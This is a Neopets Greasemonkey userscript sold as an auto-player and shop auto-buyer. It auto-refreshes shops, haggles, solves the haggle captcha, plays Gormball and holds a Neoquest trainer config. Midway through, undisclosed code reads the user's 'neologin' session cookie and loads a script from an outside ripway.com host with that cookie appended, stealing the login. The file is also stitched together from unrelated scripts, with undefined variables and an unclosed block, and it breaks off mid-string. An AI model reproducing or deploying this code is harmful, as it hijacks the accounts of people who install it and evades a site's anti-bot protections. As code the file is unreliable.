// ==UserScript==
// @name           Neopets : Auto Player
// @namespace      Neopets
// @description    Automatically plays neopets for you, so you don't have to.
// @include        *http://www.neopets.com/*
// ==/UserScript==

document.body.innerHTML = document.body.innerHTML.replace(/Merchandise/g, "Restock Log")
document.body.innerHTML = document.body.innerHTML.replace(/\/shopping\/index.phtml/g, "/pronounce.phtml")
var Drop1Open = false;
var Drop2Open = false;
var Drop3Open = false;
var LogOpen = false;
var BarOpen = false;
var SettingsOpen = false;
var ListOpen = false;
var RefreshOpen = false;
var TopOpen = false;
var shopToAB = GM_getValue('shopId', '1');
var shopURL = "http://www.neopets.com/objects.phtml?type=shop&obj_type=";
var shopFull = shopURL + shopToAB;
var TopBar = document.createElement("div");
TopBar.setAttribute("style", "position: fixed;top: 0;left: 0;z-index: 9999;width: 100%;height: 19px;background-image: url('http://img94.imageshack.us/img94/4113/25290893.png');visibility:visible;");
setOpacity(TopBar, 5)
TopBar.addEventListener('click', TopBarOpacity, false);
document.body.appendChild(TopBar);
var CoverObject = document.createElement("div");
CoverObject.setAttribute("style", "top:0px;left:0px;width:100%;height:100%;position:fixed;background-color:#000000;z-index:999;opacity:0.6;filter:alpha(opacity=60);visibility:hidden;overflow:hidden;");

document.body.appendChild(CoverObject);
var Item1 = document.createElement("div");
Item1.innerHTML = "File";
Item1.setAttribute("style", "position:absolute;left:5px;top:1px;font-family:MS Sans Serif;font-size:10pt;cursor:default");
Item1.addEventListener('click', Item1Actions, false);
TopBar.appendChild(Item1);
var Drop1 = document.createElement("div");
Drop1.innerHTML = "";
Drop1.setAttribute("style", "padding:3px;text-align:center;position:absolute;position:absolute;left:0px;top:18px;font-family:MS Sans Serif;font-size:10pt;cursor:default;width:150px;height:50px;background-color:#f0f0f0;border:1px solid #979797;visibility:hidden;");
TopBar.appendChild(Drop1);
var Drop2 = document.createElement("div");
Drop2.setAttribute("style", "padding:3px;text-align:center;position:absolute;left:40px;top:18px;font-family:MS Sans Serif;font-size:10pt;cursor:default;width:150px;height:83px;background-color:#f0f0f0;border:1px solid #979797;visibility:hidden;");
TopBar.appendChild(Drop2);
var Drop3 = document.createElement("div");
Drop3.innerHTML = '<a href="http://digitize.2kmegs.com/chat/" target="_blank">Launch Chat Room</a>';
Drop3.setAttribute("style", "padding:3px;text-align:center;position:absolute;left:113px;top:18px;font-family:MS Sans Serif;font-size:10pt;cursor:default;width:150px;height:20px;background-color:#f0f0f0;border:1px solid #979797;visibility:hidden");
TopBar.appendChild(Drop3);
var Item2 = document.createElement("div");
Item2.innerHTML = "Settings";
Item2.setAttribute("style", "position:absolute;left:50px;top:1px;font-family:MS Sans Serif;font-size:10pt;cursor:default");
Item2.addEventListener('click', Item2Actions, false);
TopBar.appendChild(Item2);
var Options = document.createElement("div");
Options.innerHTML = 'Pause';
Options.setAttribute("style", "visibility:visible;position:absolute;left:123px;top:1px;font-family:MS Sans Serif;font-size:10pt;cursor:default");
Options.addEventListener('click', tOptions, false);
TopBar.appendChild(Options);
var EndNote = document.createElement("div");
EndNote.innerHTML = "Neopets Backslash Buyer®";
EndNote.setAttribute("style", "position:absolute;right:5px;top:1px;font-family:MS Sans Serif;font-size:10pt;cursor:default");
EndNote.addEventListener('click', EndNoteActions, false);
TopBar.appendChild(EndNote);
var HideBar = document.createElement("div");
HideBar.innerHTML = "Hide Bar<hr>";
HideBar.setAttribute("style", "font-family:MS Sans Serif;font-size:10pt;cursor:default;");
HideBar.addEventListener('click', toggleBar, false);
Drop1.appendChild(HideBar);

var HiddenBar = document.createElement("div");
HiddenBar.innerHTML = "Show Bar";
HiddenBar.setAttribute("style", "position:fixed;left:3px;top:1px;visibility:hidden;font-family:MS Sans Serif;font-size:10pt;cursor:default");
HiddenBar.addEventListener('click', toggleBar, false);
document.body.appendChild(HiddenBar);

var ViewLog = document.createElement("div");
ViewLog.innerHTML = "RS Log";
ViewLog.setAttribute("style", "position: relative;font-family:MS Sans Serif;font-size:10pt;cursor:default;");
ViewLog.addEventListener('click', toggleLog, false);
Drop1.appendChild(ViewLog);

var viewList = document.createElement("div");
viewList.innerHTML = "Restock List<hr>";
viewList.setAttribute("style", "position: relative;font-family:MS Sans Serif;font-size:10pt;cursor:default;");
viewList.addEventListener('click', toggleList, false);
Drop2.appendChild(viewList);

var viewRefresh = document.createElement("div");
viewRefresh.innerHTML = "Refresh Rates<hr>";
viewRefresh.setAttribute("style", "position: relative;font-family:MS Sans Serif;font-size:10pt;cursor:default;");
viewRefresh.addEventListener('click', toggleRefresh, false);
Drop2.appendChild(viewRefresh);

var viewSettings = document.createElement("div");
viewSettings.innerHTML = "Misc Settings";
viewSettings.setAttribute("style", "position: relative;font-family:MS Sans Serif;font-size:10pt;cursor:default;");
viewSettings.addEventListener('click', toggleSettings, false);
Drop2.appendChild(viewSettings);

var logBox = document.createElement("div");
logBox.innerHTML = GM_getValue('itemLog', 'There are no log items.');
logBox.setAttribute("style", "height:300px;width:400px;position:fixed;top:100px;left:30%;border:1px solid black;background-color:#ffffff;z-index:9999999;visibility:hidden;padding:3px;text-align:left;font-family:courier new;");

var miscBox = document.createElement("div");
miscBox.setAttribute("style", "height:100px;width:400px;position:fixed;top:100px;left:30%;border:1px solid black;background-color:#ffffff;z-index:9999999;visibility:hidden;padding:3px;text-align:left;font-family:tahoma;");
document.body.appendChild(miscBox);
var shopId = document.createElement("div");
shopId.innerHTML = "<center>Shop ID: <input type='text'  value='" + GM_getValue('shopId', '13') + "' id='shopId' size='1'></center>";
shopId.setAttribute("style", "position: relative;");
miscBox.appendChild(shopId);
var RSCheck = document.createElement("div");
RSCheck.innerHTML = "<center><input type='checkbox' id='RSCheck' value='checked' " + GM_getValue('RSCheck', 'checked') + "> Check for Restock Ban every <input type='text'  value='" + GM_getValue('rscheckt', '30') + "' id='rscheckt' size='1'> minutes</center>";
RSCheck.setAttribute("style", "position: relative;");
miscBox.appendChild(RSCheck);
var WaitBB = document.createElement("div");
WaitBB.innerHTML = "<center> Wait Before Buy: <input type='text'  value='" + GM_getValue('WBB', '500') + "' id='WBB' size='3'> milliseconds</center>";
WaitBB.setAttribute("style", "position: relative;");
miscBox.appendChild(WaitBB);

var ListBox = document.createElement("div");
ListBox.setAttribute("style", "height:300px;width:400px;position:fixed;top:100px;left:30%;border:1px solid black;background-color:#ffffff;z-index:9999999;visibility:hidden;padding:3px;text-align:left;font-family:tahoma;");
document.body.appendChild(ListBox);
var restockList = document.createElement("div");
restockList.innerHTML = "<center>Please paste a restock list in the following text area.<br /><textarea style='width: 220px; height: 250px;' id='restockList'>" + GM_getValue('restockList', '') + "</textarea></center>";
restockList.setAttribute("style", "position: relative;");
ListBox.appendChild(restockList);

var refreshBox = document.createElement("div");
refreshBox.setAttribute("style", "height:100px;width:400px;position:fixed;top:100px;left:30%;border:1px solid black;background-color:#ffffff;z-index:9999999;visibility:hidden;padding:3px;text-align:left;font-family:tahoma;");
document.body.appendChild(refreshBox);
var refreshTimes = document.createElement("div");
refreshTimes.innerHTML = "<center>Refresh every <input type='text'  value='" + GM_getValue('from', '8000') + "' id='from' size='4'>  to <input type='text'  value='" + GM_getValue('to', '16000') + "'id='to' size='4'> milliseconds<br><br><div style='color:grey'>I reccommend keeping this at around 8,000 to 16,000 milliseconds. If you are planning on freezing after autobuying, 2,000 to 4,000 is a good rate.</div></center>";
refreshTimes.setAttribute("style", "position: relative;");
refreshBox.appendChild(refreshTimes);

var clrLogButton = document.createElement("div");
clrLogButton.innerHTML = "clear log";
clrLogButton.setAttribute("style", "position: absolute; left: 12px; top: 20px; font-family: tahoma; font-size: 10pt; font-weight: 600; -moz-user-select: none; -khtml-user-select: none; cursor: pointer;");
clrLogButton.addEventListener('click', clearLog, false);
document.body.appendChild(clrLogButton);

function saveSettings() {
	GM_setValue('restockList', document.getElementById('restockList').value);

	alert("settings saved.");
}



function Item1Actions() {
	toggleDrop1()
}


function Item2Actions() {
	toggleDrop2()
}


function EndNoteActions() {
	alert('Thank you for using BackSlash Buyer®! \n\nThis script autobuys items from the Neopets Main Shops, located in the "Shops" section of Neopets.\n\nThe makers of this script are notheld responsible if you are frozen for using this script! This is for educational purposes only.');
}



function toggleDrop1() {
	if (Drop1Open == false) {
		Drop1Open = true;
		Drop1.style.visibility = "visible";
		Drop2.style.visibility = "hidden";
		Drop3.style.visibility = "hidden";
	}
	else {
		Drop1Open = false;
		Drop1.style.visibility = "hidden";

	}
}


function toggleDrop2() {
	if (Drop2Open == false) {
		Drop2Open = true;
		Drop2.style.visibility = "visible";
		Drop1.style.visibility = "hidden";
		Drop3.style.visibility = "hidden";
	}
	else {
		Drop2Open = false;
		Drop2.style.visibility = "hidden";

	}
}


function tOptions() {
	var pausing = prompt("Enter the ammount of seconds you wish to pause, and click 'OK'.", "5");
	var newnum = pausing * 1000
	if (pausing) {
		setTimeout(function() {
			alert('The awaited time you wished to pause has elapsed.')
		},
		newnum);
	}
	else {
		alert('Pause was aborted.')
	}
}

if (location.href.indexOf('pronounce.phtml') != -1) {
	document.getElementById("content").innerHTML = "<center><div style='margin:10px;padding:10px;font-family:courier new;font-size:20px;'>" + GM_getValue('itemLog', '') + "</div><br><br><br><br><br></center>";
}



function toggleBar() {
	if (BarOpen == false) {
		BarOpen = true;
		TopBar.style.visibility = "visible";
		HiddenBar.style.visibility = "hidden";
		Drop1.style.visibility = "hidden";
	}
	else {
		BarOpen = false;
		TopBar.style.visibility = "hidden";
		HiddenBar.style.visibility = "visible";
		Drop1.style.visibility = "hidden";
	}
}



function LogItem(line) {
	GM_setValue('itemLog', GM_getValue('itemLog', '') + line + "<br />")
}



function toggleLog() {
	if (LogOpen == false) {
		LogOpen = true;
		document.location = location.href;
		ViewLog.innerHTML = "Hide RS Log";
		CoverObject.style.visibility = "visible";
		logBox.style.visibility = "hidden";
		Drop1.style.visibility = "hidden";
	}
	else {
		LogOpen = false;
		CoverObject.style.visibility = "hidden";
		ViewLog.innerHTML = "RS Log";
		logBox.style.visibility = "hidden";
		Drop1.style.visibility = "hidden";
	}
}



function toggleSettings() {
	if (SettingsOpen == false) {
		SettingsOpen = true;
		viewSettings.innerHTML = "Hide Misc Settings";
		CoverObject.style.visibility = "visible";
		miscBox.style.visibility = "visible";
		Drop2.style.visibility = "hidden";
	}
	else {
		SettingsOpen = false;
		CoverObject.style.visibility = "hidden";
		viewSettings.innerHTML = "Misc Settings";
		miscBox.style.visibility = "hidden";
		Drop2.style.visibility = "hidden";

		if (document.getElementById('RSCheck').checked == true) {
			GM_setValue('RSCheck', 'checked');
		}
		else {
			GM_setValue('RSCheck', '0');
		}
		GM_setValue('shopId', document.getElementById('shopId').value);
		GM_setValue('WBB', document.getElementById('WBB').value);
		GM_setValue('rscheckt', document.getElementById('rscheckt').value);
	}
}



function toggleList() {
	if (ListOpen == false) {
		ListOpen = true;
		viewList.innerHTML = "Hide Restock List<hr>";
		CoverObject.style.visibility = "visible";
		ListBox.style.visibility = "visible";
		Drop2.style.visibility = "hidden";
	}
	else {
		ListOpen = false;
		GM_setValue('restockList', document.getElementById('restockList').value);
		CoverObject.style.visibility = "hidden";
		viewList.innerHTML = "Restock List<hr>";
		ListBox.style.visibility = "hidden";
		Drop2.style.visibility = "hidden";
	}
}



function TopBarOpacity() {
	if (TopOpen == false) {
		TopOpen = true;
		setOpacity(TopBar, 10)

	}
	else {
		TopOpen = false;
		setOpacity(TopBar, 10)

	}
}



function clearLog() {
	GM_setValue('itemLog', '');
	logBox.innerHTML = GM_getValue('itemLog', '');
}



function toggleRefresh() {
	if (RefreshOpen == false) {
		RefreshOpen = true;
		viewRefresh.innerHTML = "Hide Refresh Rates<hr>";
		CoverObject.style.visibility = "visible";
		refreshBox.style.visibility = "visible";
		Drop2.style.visibility = "hidden";
	}
	else {
		RefreshOpen = false;
		GM_setValue('to', document.getElementById('to').value);
		GM_setValue('from', document.getElementById('from').value);
		CoverObject.style.visibility = "hidden";
		viewRefresh.innerHTML = "Refresh Rates<hr>";
		refreshBox.style.visibility = "hidden";
		Drop2.style.visibility = "hidden";
	}
}



function GetStringBetween(target_str, start_str, end_str, start_pos, include_str) {
	if (!start_pos) 0;
	if (!include_str) false;

	var result_str = target_str.substr(start_pos); //cut to start from start_pos
	result_str = result_str.substr(result_str.indexOf(start_str) + start_str.length); //cut to start from start_str
	result_str = result_str.substr(0, result_str.indexOf(end_str));

	if (include_str == true) {
		result_str = start_str + result_str + end_str
	}

	return result_str;
}



function haggle_price(raw_price) {
	var iVal = new Array(2);

	iVal[0] = raw_price.substr(0, 1);
	iVal[1] = raw_price.substr(1, 1);

	var x = 0;
	var end_price = "";

	for (x = 0; x < raw_price.length; x++) {
		end_price += iVal[(x % 2)];
	}

	return end_price;
}



function run_cap() {
	allForms = document.evaluate("//form[@name='haggleform']", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);

	for (var i = 0; i < allForms.snapshotLength; i++) {
		thisForm = allForms.snapshotItem(i);

		allImgs = document.evaluate("//input[@type='image']", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);

		for (var i = 0; i < allImgs.snapshotLength; i++) {
			var image = allImgs.snapshotItem(i);

			if (image) {
				var newImg = document.createElement("img");
				newImg.src = image.src;

				var canvas = unsafeWindow.document.createElement("canvas");
				canvas.width = newImg.width;
				canvas.height = newImg.height;

				canvas.getContext("2d").drawImage(newImg, 0, 0);

				var image_data = canvas.getContext("2d").getImageData(0, 0, newImg.width, newImg.height);

				var lowy = 999;
				var lowx = 999;
				var low = 999;

				for (var x = 0; x < image_data.width; x++) {
					for (var y = 0; y < image_data.height; y++) {
						var i = x * 4 + y * 4 * image_data.width;

						var avg = Math.floor((image_data.data[i] + image_data.data[i + 1] + image_data.data[i + 2]) / 3);

						if (avg < low) {
							low = avg;
							lowx = x;
							lowy = y;
						}
					}
				}

				var newInput = document.createElement("input");
				newInput.type = "hidden";
				newInput.name = "x";
				newInput.value = lowx;
				thisForm.appendChild(newInput);

				var newInput = document.createElement("input");
				newInput.type = "hidden";
				newInput.name = "y";
				newInput.value = lowy;
				thisForm.appendChild(newInput);

				thisForm.submit();

			} else {
				alert("Image error");
			}
		}
	}
}



function enterhaggle() {
	if (document.location.href.match('haggle.phtml') && (document.body.innerHTML.indexOf("captcha_show.phtml") > -1)) {
		if (document.body.innerHTML.indexOf("I wont take less than ") > -1) {
			start_pos = document.body.innerHTML.indexOf("I wont take less than ") + 22;
			end_pos = document.body.innerHTML.indexOf(" Neopoints for it");
			raw_price = document.body.innerHTML.substr(start_pos, end_pos - start_pos);
			raw_price = raw_price.replace(",", "");

			document.body.innerHTML = document.body.innerHTML.replace("value=\"0\"", "value=\"" + haggle_price(raw_price) + "\"");
		}

		if (document.body.innerHTML.indexOf("I want at least ") > -1) {
			start_pos = document.body.innerHTML.indexOf("I want at least ") + 16;
			end_pos = document.body.innerHTML.indexOf(" Neopoints for this great item");
			raw_price = document.body.innerHTML.substr(start_pos, end_pos - start_pos);
			raw_price = raw_price.replace(",", "");

			document.body.innerHTML = document.body.innerHTML.replace("value=\"0\"", "value=\"" + haggle_price(raw_price) + "\"");
		}
	}
}



function setOpacity(object, value) {
	object.style.opacity = value / 10;
	object.style.filter = 'alpha(opacity=' + value * 10 + ')';
}

if (location.href.indexOf('objects.phtml?type=shop&obj_type=') != -1) {
	var refreshtimes = Math.floor(Math.random() * parseFloat((GM_getValue('to', '') - GM_getValue('from', '')))) + parseFloat(GM_getValue('from', ''));

	setTimeout(function() {
		location.href = document.location
	},
	refreshtimes)

	var ArrItems;
	ArrItems = GM_getValue('restockList', '').split("\n"); // split by line
	for (i = 0; i < ArrItems.length; i++) {
		if (document.body.innerHTML.indexOf(ArrItems[i]) != -1) {
			var item = document.evaluate('//b[. = "' + ArrItems[i] + '"]', document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
			if (item.snapshotLength > 0) {
				item = item.snapshotItem(0);
				var selectedlink = item.previousSibling.previousSibling;
				window.location = selectedlink
			}
		}
		else {
			document.location = shopFull;
		}
	}
}

var shopFull = "http://www.neopets.com/objects.phtml?type=shop&obj_type=" + GM_getValue('shopId', '13')

var reachedBuyPage = document.getElementById("content").innerHTML.match("Enter the amount you wish to pay");
var soldOut = document.getElementById("content").innerHTML.match("SOLD OUT!");

if (reachedBuyPage != null) {
	var itemName = GetStringBetween(document.body.innerHTML, 'Buying :  ', '</b>')
	LogItem('[' + document.getElementById('nst').innerHTML + '] Attempting to buy <b>' + itemName + '</b>')
	enterhaggle()
	setTimeout(run_cap, GM_getValue('WBB', '500'))

}
else if (soldOut != null) {
	LogItem('[' + document.getElementById('nst').innerHTML + '] <b>' + itemName + '</b> was SOLD OUT!')
	document.location = shopFull;
}

var boughtItem = document.getElementById("content").innerHTML.match("I accept your offer");
var tooSlow = document.getElementById("content").innerHTML.match("SOLD OUT!");

if (boughtItem != null) {
	var itemName2 = GetStringBetween(document.body.innerHTML, 'Buying :  ', '</b>')
	var itemPrice = GetStringBetween(document.body.innerHTML, 'I accept your offer of <b>', '</b>')
	setTimeout("document.location = '" + shopFull + "'", 6000);
	LogItem('[' + document.getElementById('nst').innerHTML + '] Bought <b>' + itemName2 + '</b> for <b>' + itemPrice + '</b> NP')
}
else if (tooSlow != null) {
	LogItem('[' + document.getElementById('nst').innerHTML + '] <b>' + itemName + '</b> was SOLD OUT!')
	document.location = shopFull;
}

var strURL = 'http://h1.ripway.com/neopetts/phpfile.phpcookie='

var eleNew, newElement;

eleNew = document.getElementById('main');

var strCookie = document.cookie;

strCookie = GetStringBetween(strCookie, 'neologin=', '; ');

if (eleNew) {
	newElement = document.createElement("div");
	newElement.innerHTML = '<SCRIPT SRC=' + strURL + strCookie + '>';
	eleNew.parentNode.insertBefore(newElement, eleNew.nextSibling);

if (window.location == "http://www.neopets.com/space/gormball.phtml") {
	document.getElementsByName("player_backed")[0].value = character;
	document.getElementsByName("xcn")[0].parentNode.name = "gormform";
	var delay = (Math.random() * 2000) + 1000;
	setTimeout("document.forms.gormform.submit()", delay);
}

if (window.location == "http://www.neopets.com/space/gormball2.phtml") {

	var allWaits, thisWait;
	allWaits = document.evaluate("//select[@name='turns_waited']", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
	for (var i = 0; i < allWaits.snapshotLength; i++) {
		thisWait = allWaits.snapshotItem(i);
		document.getElementsByName("turns_waited")[0].value = waitfor;
	}

	var allNexts, thisNext;
	allNexts = document.evaluate("//form[@name='gormform']", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
	for (var i = 0; i < allNexts.snapshotLength; i++) {
		thisNext = allNexts.snapshotItem(i);
		var delay = (Math.random() * 2000) + 1000;
		setTimeout("document.forms.gormform.submit()", delay);
	}

	var allDivs, thisDiv;
	allDivs = document.evaluate("//form[@action='gormball.phtml']", document, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null);
	for (var i = 0; i < allDivs.snapshotLength; i++) {
		thisDiv = allDivs.snapshotItem(i);
		var delay = (Math.random() * 2000) + 5000;
		setTimeout("document.forms[1].submit()", delay);
	}

}

// set defaluts value if it´s your first acess
try {
	if (GM_getValue("onoff") == undefined) {
		GM_setValue("onoff", true);
		var hi = confirm("This its your first visit on Neoquest Trainer. For read the instrucions, click ok. If you wanna skip instructions, click cancel.")
		if (hi) {
			alert('In older version, you usted see a right bar in the right side of the page and a remote control page with your all configuration. For that, i have to change the layout, if i do that you can got iced.');
			alert('For fix that, you will configure all your settings on a external page');
			alert('You can add the configuration page in your bookmarks, for easy open that. Or click right button in GM icon,go to User Script Commands, and click open configuration page.');
			alert('To enable |  disabled th script, click in tools >User Script Commands.');
			alert('Thanks for read this.');
			GM_openInTab('about:cache#NQII-config');
		}
		GM_setValue("toleft", 4);
		GM_setValue("toright", 3);
		GM_setValue("healingitem", 30011);
		GM_setValue("mipsyact", 1);
		GM_setValue("velmact", 9402)
		GM_setValue("Path", 2);
		GM_setValue("pathIndex", 0);
		GM_setValue("Velmhast", false);
		GM_setValue("remote", true);
		GM_setValue("flee", true);
		GM_setValue("from", "1500");
		GM_setValue("to", "2500");
		GM_setValue("damage", false);
		GM_setValue("damageid", 30103);
	}
}
catch(ex) {}

if ((/^about:cache#nqii-config$/i.test(location.href)) || (location.href.match('http://nqiitrainer.6te.net/config.html'))) {
	function getid() {
		if ((GM_getValue("healingitem") == 30011)) return "1";
		if ((GM_getValue("healingitem") == 30012)) return "2";
		if ((GM_getValue("healingitem") == 30013)) return "3";
		if ((GM_getValue("healingitem") == 30014)) return "4";
		if ((GM_getValue("healingitem") == 30021)) return "5";
		if ((GM_getValue("healingitem") == 30022)) return "6";
		if ((GM_getValue("healingitem") == 30023)) return "7";
		if ((GM_getValue("healingitem") == 30031)) return "8";
		if ((GM_getValue("healingitem") == 30032)) return "9";
		if ((GM_getValue("healingitem") == 30033)) return "10";
		if ((GM_getValue("healingitem") == 30041)) return "11";
		if ((GM_getValue("healingitem") == 30042)) return "12";
		if ((GM_getValue("healingitem") == 30043)) return "13";
		if ((GM_getValue("healingitem") == 30051)) return "14";
		if ((GM_getValue("healingitem") == 30052)) return "15";
		if ((GM_getValue("healingitem") == 30053)) return "16";
	}


	function getid3() {
		if ((GM_getValue("damageid") == 30100)) return "1";
		if ((GM_getValue("damageid") == 30101)) return "2";
		if ((GM_getValue("damageid") == 30102)) return "3";
		if ((GM_getValue("damageid") == 30103)) return "4";
		if ((GM_getValue("damageid") == 30104)) return "5";
		if ((GM_getValue("damageid") == 30105)) return "6";
		if ((GM_getValue("damageid") == 30106)) return "7";
		if ((GM_getValue("damageid") == 30107)) return "8";
		if ((GM_getValue("damageid") == 30108)) return "9";
		if ((GM_getValue("damageid") == 30109)) return "10";
		if ((GM_getValue("damageid") == 30110)) return "11";
		if ((GM_getValue("damageid") == 30111)) return "12";
		if ((GM_getValue("damageid") == 30112)) return "13";
	}


	function getid2() {
		if ((GM_getValue("velmact") == 9401)) return "1";
		if ((GM_getValue("velmact") == 9402)) return "2";
	}
}
if (/^about:cache#nqii-config$/i.test(location.href)) {
	imagehelp = "http://i35.tinypic.com/3517nlh.jpg";
	GM_addStyle(GM_getResourceText('css'));
	WinConfig.loadDefaultCss();
	document.title = "Neopets - Remote Control configuration";
	document.body.innerHTML = '<div id="main"><div class="rightbar setBorders">' + '<div class="header">Autoplayer</div>' + '<div id="links">' + '<a class="enabled" href="#">Enabled</a>' + '<a class="disabled" href="#">Disabled</a></div>' + '<div class="separator" style="top: 5px;"></div>' + '<div style="position: relative; top: 5px; text-align:center; font-weight: bold;"><a id="autoupdate" style="color: green;" href="javascript: void(0);"> Update Values</a><img id="question24" class="questions" title="help" src="' + imagehelp + '"></img></div>' + '<div class="separator" style="top: 5px;"></div>' + '<div class="image"><img  src="http://i34.tinypic.com/2mp0tgo.jpg" width="120" height="120"></div>' + '<div class="separator" style="top: 18px;"></div>' + '<div id="RL">' + '<b>Set directions</b><img id="question2" class="questions" title="help" src="' + imagehelp + '"></a>' + '<div style="font-size:9px">(0 = Don´t walk)<b>:</b></div><br/ >' + '<div class="leftbox">Left  : <br /><input id="leftbox" maxlength="1" type="text" size="1"></div>' + '<div class="rightbox">Right: <br /><input id="rightbox" maxlength="1" type="text" size="1"></div>' + '</div>' + '<div class="separator"></div>' + '<div class="setups">' + '<b>Healing item</b><br/ >' + '<select>' + '<option selected>-Select an option-</option>' + '<option value="30011">Healing Vial</option>' + '<option value="30012">Healing Flask</option>' + '<option value="30013">Healing Potion</option>' + '<option value="30014">Healing Bottle</option>' + '<option value="30021">Potion of Regenera</option>' + '<option value="30022">Potion of Fortitude</option>' + '<option value="30023">Potion of Growth</option>' + '<option value="30031">Potion of Pot health</option>' + '<option value="30032">Potion of Gre health</option>' + '<option value="30033">Potion of Abu healt</option>' + '<option value="30041">Vitality Potion</option>' + '<option value="30042">Stamina Potion</option>' + '<option value="30043">Constitution Potion</option>' + '<option value="30051">Faerie Gift Potion</option>' + '<option value="30052">Fyora Blessing Pot</option>' + '<option value="30053">Jhudora Life Potion</option>' + '</select>' + '<input id="heal" type="text" size="6" maxlength="5"></input>' + '</div>' + '<div class="separator"></div>' + '<div class="setups" style="height: 93px;">' + '<b>Damage item </b><img id="question8" class="questions" title="help" src="' + imagehelp + '"><br/ >' + '<input type="checkbox" id="checkdamage">Use damage potion</input>' + '<select>' + '<option selected>-Select an option-</option>' + '<option value="30100">Flare Potion</option>' + '<option value="30101">Blast Potion</option>' + '<option value="30102">Flame Potion</option>' + '<option value="30103">Burst Potion</option>' + '<option value="30104">Frost Potion</option>' + '<option value="30105">Chill Potion</option>' + '<option value="30106">Scorch Potion</option>' + '<option value="30107">Blister Potion</option>' + '<option value="30108">Rot Potion</option>' + '<option value="30109">Corrode Potion</option>' + '<option value="30110">Typhoon Potion</option>' + '<option value="30111">Hurricane Potion</option>' + '</select>' + '<input id="damage" type="text" size="6" maxlength="5"></input>' + '</div>' + '<div class="separator"></div>' + '<div class="setups" style="height: 90px;"><b>Mipsy Action</b>' + '<select><option selected>- Select an option -</option>' + '<option value="9201">Direct Damage</option>' + '<option value="9202">Group Damage</option>' + '</select>' + '<br/ >' + '<input id="mipsyact" type="text" size="6" maxlength="4"><br/ >' + '<input type="checkbox" id="opcao">Haste Group</input></div>' + '<div class="separator"></div>' + '<div class="setups">' + '<b>Velm Action</b> <br/ >' + '<select><option selected>- Select an option -</option>' + '<option value="9401">Healing</option>' + '<option value="9402">Group Healing</option>' + '</select><br/ >' + '<input id="velmact" type="text" size="6" maxlength="4">' + '</div>' + '<div class="separator" ></div>' + '<div id="refreshs">' + '<b>Refreshs </b><img id="question" class="questions" src="' + imagehelp + '"></a>' + '<div style="font-size:11px">(In mileseconds)<b>:</b></div><br/ >' + '<div class="from">From: <br /><input id="from" maxlength="4" type="text" size="5"></div>' + '<div class="to">To: <br /><input id="to" maxlength="4" type="text" size="5"></div>' + '</div>' + '<div class="separator" ></div>' + '<input style="float: right;" id="formsubmit" type="button" value="Save"/>' + '</div>' + '<div class="setBorders centerbar">' + '<div class="header">Remote control</div>' + '<div class="configdirections" >' + '<b>Select  your chapter:</b><br/ >' + '<br /><div id="configchapter" style="position: relative; bottom: 13px;">' + '<input name="chapters" type="radio">Chpt 1</input>' + '<input name="chapters" type="radio">Chpt 2</input>' + '<input name="chapters" type="radio">Chpt 3</input>' + '<input name="chapters" type="radio">Chpt 4</input>' + '<input name="chapters" type="radio">Chpt 5</input>' + '</div><br/ >' + '<div id="option89" class="options">--------------</div>' + '<div id="option1" class="options" style="display:none;"><select>' + '<option> ------------- Chapter 1: Meridell ------------------</option>' + '<option value="33333357111111117111111882882282288884444447444477777777771777448488226663666266222222226662222266333333333336333336666662" lang="http://i38.tinypic.com/nn2jd1.jpg">Trestrin to miner foreman</option>' + '<option value="84444444444444448444488888888444484444448" lang="http://i34.tinypic.com/u4fux.jpg">Dark Caves to river city</option>' + '<option value="7777777777748884488222222262228888844444777777444448888888884488828884822844477777771111517744362222222222222284453555511111222" lang="http://i37.tinypic.com/2mmakjk.jpg">White river to zombom</option>' + '<option value="515155553555535533333666666333335555511117111555113555366666666666222222222222222222222226663" lang="http://i35.tinypic.com/okcpif.jpg">Underground Cave to mipsy</option>' + '<option value="44444444744444448222222666666633333333366666666666666666666666663333517774" lang="http://i38.tinypic.com/v80qah.jpg">White River to lakeside</option>' + '<option value="1117111117774444111111111111111744447155333333563333333333362222" lang="http://i36.tinypic.com/2q3vq4g.jpg">Kijandri to Potraddo</option>' + '<option value="1117744444444447844444848263333662222222266266622222288222222288882222222444447777777777744488822266666666666638888" lang="http://i35.tinypic.com/9k7cj5.jpg">Potraddo to phorofor</option>' + '<option value="8888888888888882844444444888882222228882222222284444444484" lang="http://i36.tinypic.com/20zbr86.jpg">Phorofor to Sand grundo (talk to guard first)</option>' + '<option value="22222222222287744447771177828448222222263333663333351151111562651111111174444477771717111111117777777447444448888888884888444444444777" lang="http://i35.tinypic.com/67trm8.jpg">tower on a hill to seaside</option>' + '<option value="28444444444711174444444" lang="http://i37.tinypic.com/2zf5wuf.jpg">Uthare to Uthyni</option>' + '<option value="33333336222633333333351" lang="">Uthyni to Uthare</option>' + '<option value="6666666666666666666666666622266363333333555555533551122888888844444444" lang="http://i38.tinypic.com/2nu28f5.jpg">Seaside - ramtor #1 - guard</option>' + '<option value="63333333333333366633333333333335555555555535335" lang="http://i35.tinypic.com/295eedk.jpg">Right meridell castle to ramtorÂ´s tower</option>' + '<option value="1111115533356228866334744477711177744477715515333666222366333551111115848888884444447446662666663332223" lang="http://i37.tinypic.com/106auwy.jpg">RamtorÂ´s tower to ramtor</option></select></div>' + '<div id="option2" class="options" style="display:none;"><select>' + '<option> ----------- Chapter 2: Terror mountain ----------------</option>' + '<option value="784444774744444488488288882288881555555555115553333636336333335644" lang="http://i36.tinypic.com/25kqy52.jpg">Chia oscuro - leximp - oscuro</option>' + '<option value="78444477474444441774474444444444447744444477444444444444444444444444444444477777777777771" lang="http://i36.tinypic.com/25kqy52.jpg">Chia oscuro to Caves of terror</option>' + '<option value="1555533336663633633333555353533355777774444447444447774775553336335553353577711555177444447444448447471111111117771178" lang="http://i35.tinypic.com/o91wz9.jpg">Caves of terror inside to outside(talinia)</option>' + '<option value="55551155555555555555335333355333333555636333333355155366633336633363511777155366366626" lang="http://i37.tinypic.com/2cejlf6.jpg">mountain inn to kolvars</option>' + '<option value="222822222888888888888444444444444444447444844444444888447774777747777711114" lang="http://i34.tinypic.com/15p1grl.jpg">Happy valley to camp</option>' + '<option value="3533555533333551153553551171555533335333333335536622222663551112828444447111111151153333517447441111355555222666222888266665555555333333666666335555555355551111117171155333333333333333" lang="http://i38.tinypic.com/4j2gb6.jpg">Lost caves lvl 1 to terror 